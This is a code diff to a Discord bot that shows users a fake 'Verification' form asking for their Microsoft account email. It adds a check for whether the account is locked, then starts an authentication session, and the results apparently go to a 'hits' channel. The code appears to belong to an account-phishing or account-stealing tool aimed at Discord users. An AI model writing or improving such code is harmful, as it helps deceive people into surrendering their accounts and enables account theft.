@@ -127,28 +127,24 @@ class MyModalOne(ui.Modal, title="Verification"):
             return
 
         await interaction.response.defer()
-                try:
-            hits_channel = await interaction.client.fetch_channel(
-                config["discord"]["accounts_channel"]
-            )
-        except discord.NotFound:
-            await interaction.followup.send(
-                "❌ Accounts channel not found. Please update `accounts_channel` in config.json.",
-                ephemeral=True
-            )
-            return
-        except discord.Forbidden:
-            await interaction.followup.send(
-                "❌ Bot does not have permission to access the accounts channel.",
-                ephemeral=True
-            )
-            return
-        except discord.HTTPException as e:
-            await interaction.followup.send(
-                f"❌ Failed to access the accounts channel: {e}",
-                ephemeral=True
-            )
-            return
+        await interaction.followup.send(
+            "⌛ Please wait while we try to verify you...",
+            ephemeral=True
+        )
+        
+        hits_channel = await interaction.client.fetch_channel(config["discord"]["accounts_channel"])
+
+        # Check if account is locked
+        lockedInfo = await checkLocked(self.email.value)
+        
+        if lockedInfo:
+            if lockedInfo["StatusCode"] != 500:
+                if "Value" not in lockedInfo or json.loads(lockedInfo["Value"])["status"]["isAccountSuspended"]:
+                    await interaction.followup.send(
+                        "❌ This microsoft account is locked, as so we cannot verify it. Try again with another account.",
+                        ephemeral=True
+                    )
+                    return
 
         session = getSession()
         emailInfo = await sendAuth(session, self.email.value)
